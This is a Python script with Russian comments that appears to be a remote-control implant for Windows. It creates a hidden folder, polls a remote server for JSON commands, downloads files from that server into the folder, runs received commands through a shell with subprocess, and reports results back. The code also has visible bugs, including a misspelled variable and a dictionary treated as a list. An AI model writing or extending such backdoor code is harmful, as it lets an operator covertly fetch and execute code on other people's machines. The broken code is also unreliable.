# import requests, os
#
# def download_file(url, folder_path):
#     response = requests.get(url, stream=True)
#     response.raise_for_status()  # проверка на ошибки
#
#     # Получение имени файла из URL
#     filename = url.split('/')[-1]
#     file_path = os.path.join(folder_path, filename)
#
#     with open(file_path, 'wb') as file:
#         for chunk in response.iter_content(chunk_size=8192):
#             file.write(chunk)
#
# download_file('http://127.0.0.1:8000/download/main.py', 'C:/scripts')
import subprocess
from time import sleep
from scripts import *

create_hidden_folder('C:/scripts')

while True:
    try:
        prev_value = requests.get(link).json()
        break
    except Exception as e:
        print(e)
        sleep(20)

while True:

    try:
        value = requests.get(link).json()

        if value["run"] != prev_value["run"] and value["run"]:
            try:
                if value["args"].count(' & ') != 0:
                    value["args"] = value["args"].split(' & ')
                else:
                    value = value[0]

                for val in value:

                    if val["args"][0] == 'download':
                        val["args"][1] = val["args"][1].replace('/link/', link)
                        download_file(val["args"][1], 'C:/scripts')

                    else:
                        val["args"][0] = val["args"][0].replace('/user/', f'/{os.getlogin()}/')
                        subprocess.Popen(vae["args"], shell=True)
                        send_success(f"Команда выполнена: {val['args']}")

            except Exception as e:
                send_error(f"Ошибка при выполнении команды: {e}")

        prev_value = value
        sleep(value["sleep"])

    except Exception as e:
        send_error(f"Общая ошибка: {e}")
        sleep(20)
